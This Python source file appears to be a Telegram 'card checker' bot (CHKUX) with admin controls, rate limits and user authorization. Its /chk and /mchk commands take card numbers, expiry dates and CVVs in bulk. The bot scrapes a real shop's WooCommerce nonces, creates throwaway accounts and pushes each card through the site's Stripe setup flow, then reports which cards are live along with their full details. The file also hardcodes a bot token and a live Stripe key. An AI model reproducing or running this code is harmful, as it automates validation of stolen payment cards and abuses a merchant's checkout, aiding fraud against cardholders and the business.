import requests
import json
import re
import random
import logging
import asyncio
import os
import time
from collections import defaultdict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram.constants import ParseMode

# --- Configuration & Admin Setup ---
TOKEN = "8403880461:AAGMcFCu2mx_dQ0wiPYLW-PUCM8bPhf_OY8"
ADMIN_IDS = [6665922898,7024069066]
SETTINGS_FILE = 'bot_settings.json'

# --- Logging Setup ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Settings Management ---
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            loaded_settings = json.load(f)
    else:
        loaded_settings = {}
        
    defaults = {
        'chk_enabled': True, 'chk_message': "❗️ The /chk command is currently disabled by the admin.",
        'mchk_enabled': True, 'mchk_message': "❗️ The /mchk command is currently disabled by the admin.",
        'chk_hourly_limit': 0, 'mchk_hourly_limit': 0,
        'chk_cooldown': 0, 'mchk_cooldown': 0,
        'mchk_max_cards': 0,
        'auth_mode_enabled': False,
        'authorized_users': [],
        'blocked_users': []
    }
    for key, value in defaults.items():
        if key not in loaded_settings:
            loaded_settings[key] = value
            
    save_settings(loaded_settings)
    return loaded_settings

def save_settings(settings_data):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings_data, f, indent=4)

settings = load_settings()

# --- Authorization Logic ---
async def is_user_authorized(update: Update) -> bool:
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if user_id in ADMIN_IDS: return True
    if user_id in settings.get('blocked_users', []): return False
    if not settings.get('auth_mode_enabled', False): return True
    if user_id in settings.get('authorized_users', []) or chat_id in settings.get('authorized_users', []): return True
    return False

# --- Core Card Processing Logic ---
def gets(text_content, start_string, end_string):
    try:
        match = re.search(re.escape(start_string) + r'(.*?)' + re.escape(end_string), text_content, re.DOTALL)
        return match.group(1) if match else None
    except Exception:
        return None

def process_card(cc, mes, ano, cvv):
    session = requests.Session()
    mail = "tanxid" + str(random.randint(9999, 999999)) + "@gmail.com"
    try:
        headers_get_reg = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
        r1 = session.get('https://chilliwackfishandgame.com/my-account/', headers=headers_get_reg, timeout=20)
        nonce1 = gets(r1.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
        if not nonce1:
            return json.dumps({"success": False, "data": {"error": {"message": "Nonce 1 Error"}}})

        headers_post_reg = {'origin': 'https://chilliwackfishandgame.com', 'referer': 'https://chilliwackfishandgame.com/my-account/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
        data_reg = {'email': mail, 'woocommerce-register-nonce': nonce1, '_wp_http_referer': '/my-account/', 'register': 'Register'}
        session.post('https://chilliwackfishandgame.com/my-account/', headers=headers_post_reg, data=data_reg, timeout=20)

        headers_get_payment = {'referer': 'https://chilliwackfishandgame.com/my-account/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
        r2 = session.get('https://chilliwackfishandgame.com/my-account-2/payment-methods/', headers=headers_get_payment, timeout=20)
        nonce2 = gets(r2.text,'"createAndConfirmSetupIntentNonce":"','","')
        if not nonce2:
            return json.dumps({"success": False, "data": {"error": {"message": "Nonce 2 Error"}}})

        headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; WALPAD_8G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
        data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={ano}&card[exp_month]={mes}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F6f8f11ac73%3B+stripe-js-v3%2F6f8f11ac73%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fchilliwackfishandgame.com&time_on_page={random.randint(30000, 90000)}&guid={random.randint(10000000, 99999999)}-ec12-417b-bb2a-{random.randint(100000000000, 999999999999)}&muid={random.randint(10000000, 99999999)}-ec12-417b-bb2a-{random.randint(100000000000, 999999999999)}&sid={random.randint(10000000, 99999999)}-e85f-4730-951b-{random.randint(100000000000, 999999999999)}&key=pk_live_dqqoLyQS1I311an1MOzKNOU800LttYjqLf'
        r3 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
        stripe_json = r3.json()

        if 'id' not in stripe_json or not stripe_json['id'].startswith('pm_'):
            error_message = stripe_json.get('error', {}).get('message', 'Stripe API Error.')
            return json.dumps({"success": False, "data": {"error": {"message": error_message}}})
        pm_id = stripe_json['id']

        headers_confirm = {'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://chilliwackfishandgame.com', 'referer': 'https://chilliwackfishandgame.com/my-account-2/add-payment-method/', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
        params_confirm = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data_confirm = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': nonce2}
        r4 = session.post('https://chilliwackfishandgame.com/', params=params_confirm, headers=headers_confirm, data=data_confirm, timeout=20)
        return r4.text
    except Exception as e:
        logger.error(f"process_card error: {e}")
        return json.dumps({"success": False, "data": {"error": {"message": f"Script Error: {e}"}}})

# --- Admin Panel ---
async def get_admin_keyboard(menu_type="main"):
    if menu_type == "chk":
        keyboard = [
            [InlineKeyboardButton(f"Status: {'ON ✅' if settings['chk_enabled'] else 'OFF ❌'}", callback_data="admin:toggle:chk_enabled")],
            [InlineKeyboardButton(f"Cooldown: {settings['chk_cooldown']}s", callback_data="admin:set:chk_cooldown")],
            [InlineKeyboardButton(f"Limit: {settings['chk_hourly_limit']}/hr", callback_data="admin:set:chk_hourly_limit")],
            [InlineKeyboardButton("Set Disabled Message", callback_data="admin:set:chk_message")],
            [InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="admin:menu:main")]
        ]
        text = "⚙️ /chk Command Settings"
    elif menu_type == "mchk":
        keyboard = [
            [InlineKeyboardButton(f"Status: {'ON ✅' if settings['mchk_enabled'] else 'OFF ❌'}", callback_data="admin:toggle:mchk_enabled")],
            [InlineKeyboardButton(f"Cooldown: {settings['mchk_cooldown']}s", callback_data="admin:set:mchk_cooldown")],
            [InlineKeyboardButton(f"Limit: {settings['mchk_hourly_limit']}/hr", callback_data="admin:set:mchk_hourly_limit")],
            [InlineKeyboardButton(f"Max Cards: {settings['mchk_max_cards']}", callback_data="admin:set:mchk_max_cards")],
            [InlineKeyboardButton("Set Disabled Message", callback_data="admin:set:mchk_message")],
            [InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="admin:menu:main")]
        ]
        text = "⚙️ /mchk Command Settings"
    else: # Main menu
        keyboard = [
            [InlineKeyboardButton(f"Auth Mode: {'ON ✅' if settings.get('auth_mode_enabled') else 'OFF ❌'}", callback_data="admin:toggle:auth_mode_enabled")],
            [InlineKeyboardButton("🔧 /chk Settings", callback_data="admin:menu:chk")],
            [InlineKeyboardButton("🔧 /mchk Settings", callback_data="admin:menu:mchk")],
        ]
        text = "⚙️ Admin Control Panel"
    
    return text, InlineKeyboardMarkup(keyboard)

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text, reply_markup = await get_admin_keyboard("main")
    await update.message.reply_text(text, reply_markup=reply_markup)

async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    if user_id not in ADMIN_IDS:
        await query.answer("Access Denied: Only admins can use these buttons.", show_alert=True)
        return
    await query.answer()
    _, action, setting_key = query.data.split(":")
    if action == "menu":
        text, reply_markup = await get_admin_keyboard(setting_key)
        await query.edit_message_text(text=text, reply_markup=reply_markup)
    elif action == "toggle":
        settings[setting_key] = not settings[setting_key]
        save_settings(settings)
        menu_type = 'main' if 'auth' in setting_key else setting_key.split('_')[0]
        text, reply_markup = await get_admin_keyboard(menu_type)
        await query.edit_message_text(text=text, reply_markup=reply_markup)
    elif action == "set":
        context.chat_data['waiting_for_setting'] = setting_key
        context.chat_data['admin_message_id'] = query.message.message_id
        await query.message.reply_text(f"Please send the new value for `{setting_key}`.\n(Send 'cancel' to abort)", parse_mode=ParseMode.MARKDOWN)

async def admin_receive_message_update(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    setting_key = context.chat_data.pop('waiting_for_setting', None)
    admin_message_id = context.chat_data.pop('admin_message_id', None)
    if not setting_key: return
    if update.message.text.lower() == 'cancel':
        await update.message.reply_text("✅ Operation cancelled.")
        return
    new_value = update.message.text
    if 'message' not in setting_key:
        try:
            numeric_value = int(new_value)
            if numeric_value < 0:
                await update.message.reply_text("❗️ Invalid. Please enter a number that is 0 or greater.")
                return
            settings[setting_key] = numeric_value
        except ValueError:
            await update.message.reply_text("❗️ Invalid. Please enter a valid number.")
            return
    else:
        settings[setting_key] = new_value
    save_settings(settings)
    await update.message.reply_text(f"✅ Setting `{setting_key}` updated successfully.", parse_mode=ParseMode.MARKDOWN)
    if admin_message_id:
        menu_type = setting_key.split('_')[0]
        text, reply_markup = await get_admin_keyboard(menu_type)
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id, message_id=admin_message_id,
                text=text, reply_markup=reply_markup
            )
        except Exception as e:
            logger.error(f"Failed to edit admin panel message: {e}")

# --- Admin Commands for User Management ---
async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: `/adduser <user_id or group_id>`")
        return
    if target_id in settings['blocked_users']:
        settings['blocked_users'].remove(target_id)
    if target_id not in settings['authorized_users']:
        settings['authorized_users'].append(target_id)
        save_settings(settings)
        await update.message.reply_text(f"✅ User/Group ID `{target_id}` has been authorized.")
    else:
        await update.message.reply_text(f"ℹ️ User/Group ID `{target_id}` is already authorized.")

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: `/removeuser <user_id or group_id>`")
        return
    if target_id in settings['authorized_users']:
        settings['authorized_users'].remove(target_id)
        save_settings(settings)
        await update.message.reply_text(f"✅ User/Group ID `{target_id}` has been removed from authorized list.")
    else:
        await update.message.reply_text(f"ℹ️ User/Group ID `{target_id}` was not on the authorized list.")

async def blockuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: `/blockuser <user_id>`")
        return
    if target_id in settings['authorized_users']:
        settings['authorized_users'].remove(target_id)
    if target_id not in settings['blocked_users']:
        settings['blocked_users'].append(target_id)
        save_settings(settings)
        await update.message.reply_text(f"✅ User ID `{target_id}` has been blocked.")
    else:
        await update.message.reply_text(f"ℹ️ User ID `{target_id}` is already blocked.")

async def unblockuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: `/unblockuser <user_id>`")
        return
    if target_id in settings['blocked_users']:
        settings['blocked_users'].remove(target_id)
        save_settings(settings)
        await update.message.reply_text(f"✅ User ID `{target_id}` has been unblocked.")
    else:
        await update.message.reply_text(f"ℹ️ User ID `{target_id}` was not on the blocked list.")

async def admincmd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/admincmd command triggered by admin {update.effective_user.id}")
    help_text = (
        "*Admin Command Reference*\n\n"
        "Here are the commands available only to admins:\n\n"
        "*⚙️ Control Panel*\n"
        "`/admin` - Opens the interactive admin control panel.\n\n"
        "*👤 User & Group Management*\n"
        "`/adduser <ID>` - Authorizes a user or group ID.\n"
        "`/removeuser <ID>` - Removes a user or group ID.\n"
        "`/blockuser <ID>` - Blocks a user ID.\n"
        "`/unblockuser <ID>` - Removes a user ID from the block list.\n\n"
        "*ℹ️ Help*\n"
        "`/admincmd` - Shows this list of admin commands."
    )
    try:
        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"Failed to send /admincmd message: {e}")
        await update.message.reply_text("An error occurred while trying to display the admin commands.")

# --- User Commands & Helpers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_name = update.effective_user.first_name
    await update.message.reply_text(f"Hello {user_name} 👋\nWelcome to CHKUX⚡. Use /chk or /mchk to use the bot.")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_user_authorized(update):
        await update.message.reply_text("⚠️YOU ARE NOT AUTHORIZED. CONTACT BOT OWNER TO USE.")
        return

    stopper_id = update.effective_user.id
    is_admin = stopper_id in ADMIN_IDS
    active_tasks = context.chat_data.get('active_tasks', {})
    stopped_count = 0

    for task_name, task_info in list(active_tasks.items()):
        task_object = task_info.get('task')
        owner_id = task_info.get('user_id')

        if task_object and not task_object.done():
            if is_admin or stopper_id == owner_id:
                if task_name == 'mchk':
                    context.chat_data['stop_mchk'] = True
                task_object.cancel()
                stopped_count += 1
    
    if stopped_count > 0:
        await update.message.reply_text(f"❗️ Stop signal sent. {stopped_count} running process(es) will be terminated.")
    else:
        if is_admin:
            await update.message.reply_text("ℹ️ No processes are currently running in this chat.")
        else:
            await update.message.reply_text("ℹ️ You have no running processes to stop.")

# --- UPDATED: check_user_limits now uses context.user_data ---
def check_user_limits(context: ContextTypes.DEFAULT_TYPE, command_type: str) -> (bool, str):
    """A centralized function to check cooldown and hourly limits for a user."""
    # This now uses user_data, which is specific to each user, fixing the group limit bug.
    user_data = context.user_data
    current_time = time.time()
    
    # Cooldown Check
    cooldown = settings.get(f'{command_type}_cooldown', 0)
    if cooldown > 0:
        last_used = user_data.get(f'last_{command_type}_time', 0)
        if current_time - last_used < cooldown:
            remaining = cooldown - (current_time - last_used)
            return False, f"❗️ Please wait {remaining:.1f}s before using this command again."

    # Hourly Limit Check
    hourly_limit = settings.get(f'{command_type}_hourly_limit', 0)
    if hourly_limit > 0:
        timestamps = user_data.get(f'{command_type}_timestamps', [])
        # Filter out timestamps older than 1 hour (3600 seconds)
        valid_timestamps = [ts for ts in timestamps if current_time - ts < 3600]
        user_data[f'{command_type}_timestamps'] = valid_timestamps
        
        if len(valid_timestamps) >= hourly_limit:
            return False, f"❗️ You have reached the hourly limit of {hourly_limit} checks."
            
    # Record usage if checks pass
    user_data[f'last_{command_type}_time'] = current_time
    if hourly_limit > 0:
        # Initialize the list if it doesn't exist before appending
        if f'{command_type}_timestamps' not in user_data:
            user_data[f'{command_type}_timestamps'] = []
        user_data[f'{command_type}_timestamps'].append(current_time)
        
    return True, ""

def get_input_text(update: Update) -> str | None:
    message = update.effective_message
    if message.reply_to_message:
        return message.reply_to_message.text or message.reply_to_message.caption
    
    text = message.text
    if ' ' in text:
        # This handles both "/cmd ..." and ".cmd ..."
        return text.split(' ', 1)[1].strip()
    return None

def extract_cards_from_text(text: str) -> list[str]:
    if not text: return []
    card_pattern = re.compile(r'\b(\d{15,16})[|/\s]+(\d{1,2})[|/\s]+(\d{2,4})[|/\s]+(\d{3,4})\b')
    return ['|'.join(parts) for parts in card_pattern.findall(text)]

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_user_authorized(update):
        await update.message.reply_text("⚠️YOU ARE NOT AUTHORIZED. CONTACT BOT OWNER TO USE.")
        return
    if not settings['chk_enabled']:
        await update.message.reply_text(settings['chk_message'])
        return
    if context.chat_data.get('active_tasks', {}).get('chk'):
        await update.message.reply_text("❗️ A /chk process is already running. Use /stop to cancel.")
        return
    can_proceed, message = check_user_limits(context, 'chk')
    if not can_proceed:
        await update.message.reply_text(message)
        return
    input_text = get_input_text(update)
    all_cards = extract_cards_from_text(input_text)
    if not all_cards:
        await update.message.reply_text("Usage: `/chk CC|MM|YY|CVV`\nOr reply to a message containing cards.", parse_mode=ParseMode.MARKDOWN)
        return
    user_input = all_cards[0]
    try:
        parts = user_input.split('|')
        cc, mes, ano_raw, cvv = parts
        ano = ano_raw[-2:] if len(ano_raw) == 4 else ano_raw
    except ValueError:
        await update.message.reply_text(f"❗️ Invalid card format found: `{user_input}`", parse_mode=ParseMode.MARKDOWN)
        return

    async def _do_single_check(cc, mes, ano, cvv):
        msg = await update.message.reply_text("♻️ Checking card...")
        try:
            loop = asyncio.get_running_loop()
            api_response_text = await loop.run_in_executor(None, process_card, cc, mes, ano, cvv)
            status, response_message = "DECLINED ❌", "Unknown Error"
            try:
                api_json = json.loads(api_response_text)
                if api_json.get("success"):
                    status, response_message = "APPROVED ✅", api_json.get("data", {}).get("status", "Succeeded").title()
                else:
                    response_message = api_json.get("data", {}).get("error", {}).get("message", "No reason provided.")
            except json.JSONDecodeError:
                response_message = "Failed to parse API response."
            final_text = f"🔰CC CHECK COMPLETE\n┏━♻️STATUS: {status}\n┣📋RESPONSE: {response_message}\n┣💳CC NUMBER: `{cc}`\n┣💳EXP MONTH: `{mes}`\n┣💳EXP YEAR: `{ano}`\n┣💳CVV: `{cvv}`\n┣━━━━━━━━━━━━━━━━━━━━━\n©️MADE BY OZYREN X ZIHAD ⚡"
            await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=final_text, parse_mode=ParseMode.MARKDOWN)
        except asyncio.CancelledError:
            logger.info(f"CHK task for user {update.effective_user.id} was cancelled.")
            await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="🛑 Check cancelled by user.")
        finally:
            if 'active_tasks' in context.chat_data:
                context.chat_data['active_tasks'].pop('chk', None)
    
    task = asyncio.create_task(_do_single_check(cc, mes, ano, cvv))
    context.chat_data.setdefault('active_tasks', {})['chk'] = {
        'task': task, 
        'user_id': update.effective_user.id
    }

async def _mchk_loop_task(update: Update, context: ContextTypes.DEFAULT_TYPE, card_lines: list):
    loop = asyncio.get_running_loop()
    processed_count = 0
    total_cards = len(card_lines)
    try:
        for line in card_lines:
            if context.chat_data.get('stop_mchk'):
                await update.message.reply_text("🛑 Mass check stopped by user.", reply_to_message_id=update.message.message_id)
                break
            await asyncio.sleep(1) 
            processed_count += 1
            try:
                parts = line.strip().split('|')
                cc, mes, ano_raw, cvv = parts
                ano = ano_raw[-2:] if len(ano_raw) == 4 else ano_raw
            except ValueError:
                await update.message.reply_text(f"Skipping invalid line: `{line}`", parse_mode=ParseMode.MARKDOWN)
                continue
            api_response_text = await loop.run_in_executor(None, process_card, cc, mes, ano, cvv)
            status, response_message = "DECLINED ❌", "Unknown Error"
            try:
                api_json = json.loads(api_response_text)
                if api_json.get("success"): status, response_message = "APPROVED ✅", api_json.get("data", {}).get("status", "Succeeded").title()
                else: response_message = api_json.get("data", {}).get("error", {}).get("message", "No reason provided.")
            except json.JSONDecodeError: response_message = "Failed to parse API response."
            final_text = f"🔰CC CHECK {processed_count}/{total_cards}\n┏━♻️STATUS: {status}\n┣📋RESPONSE: {response_message}\n┣💳CC NUMBER: `{cc}`\n┣💳EXP MONTH: `{mes}`\n┣💳EXP YEAR: `{ano}`\n┣💳CVV: `{cvv}`\n┣━━━━━━━━━━━━━━━━━━━━━\n©️MADE BY OZYREN X ZIHAD ⚡"
            await update.message.reply_text(final_text, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"🏁 Mass check complete! Processed {processed_count} card(s).")
    except asyncio.CancelledError:
        logger.info(f"MCHK task for user {update.effective_user.id} was cancelled.")
        await update.message.reply_text("🛑 Mass check process forcefully cancelled.", reply_to_message_id=update.message.message_id)
    finally:
        context.chat_data['stop_mchk'] = False
        context.chat_data['mchk_running'] = False
        if 'active_tasks' in context.chat_data:
            context.chat_data['active_tasks'].pop('mchk', None)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_user_authorized(update):
        await update.message.reply_text("⚠️YOU ARE NOT AUTHORIZED. CONTACT BOT OWNER TO USE.")
        return
    if not settings['mchk_enabled']:
        await update.message.reply_text(settings['mchk_message'])
        return
    if context.chat_data.get('active_tasks', {}).get('mchk'):
        await update.message.reply_text("❗️ A /mchk process is already running. Use /stop to cancel.")
        return
    can_proceed, message = check_user_limits(context, 'mchk')
    if not can_proceed:
        await update.message.reply_text(message)
        return
    input_text = get_input_text(update)
    card_lines = extract_cards_from_text(input_text)
    if not card_lines:
        await update.message.reply_text("Usage: `/mchk [list of cards]`\nOr reply to a message containing cards.", parse_mode=ParseMode.MARKDOWN)
        return
    max_cards = settings.get('mchk_max_cards', 0)
    if max_cards > 0 and len(card_lines) > max_cards:
        await update.message.reply_text(f"❗️ You can only check up to {max_cards} cards at a time. You provided {len(card_lines)}.")
        return
    context.chat_data['stop_mchk'] = False
    context.chat_data['mchk_running'] = True
    await update.message.reply_text(f"✅ Starting mass check for {len(card_lines)} card(s)... (use /stop to cancel)")
    task = asyncio.create_task(_mchk_loop_task(update, context, card_lines))
    context.chat_data.setdefault('active_tasks', {})['mchk'] = {
        'task': task,
        'user_id': update.effective_user.id
    }

def main() -> None:
    application = Application.builder().token(TOKEN).build()
    
    admin_filter = filters.User(user_id=ADMIN_IDS)

    # User Command Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    # Handlers for /chk and /mchk
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    
    # --- ADDED: Handlers for .chk and .mchk ---
    # These use a regex filter to find messages starting with .chk or .mchk
    # and pass them to the same command functions.
    application.add_handler(MessageHandler(filters.Regex(r'^\.chk'), chk_command))
    application.add_handler(MessageHandler(filters.Regex(r'^\.mchk'), mchk_command))
    
    # Admin Command Handlers
    application.add_handler(CommandHandler("admin", admin_command, filters=admin_filter))
    application.add_handler(CommandHandler("admincmd", admincmd_command, filters=admin_filter))
    application.add_handler(CommandHandler("adduser", adduser_command, filters=admin_filter))
    application.add_handler(CommandHandler("removeuser", removeuser_command, filters=admin_filter))
    application.add_handler(CommandHandler("blockuser", blockuser_command, filters=admin_filter))
    application.add_handler(CommandHandler("unblockuser", unblockuser_command, filters=admin_filter))

    # Handlers for admin panel interaction
    application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^admin:"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & admin_filter, admin_receive_message_update))

    logger.info("Bot started and is polling for updates...")
    application.run_polling()

if __name__ == '__main__':
    main()
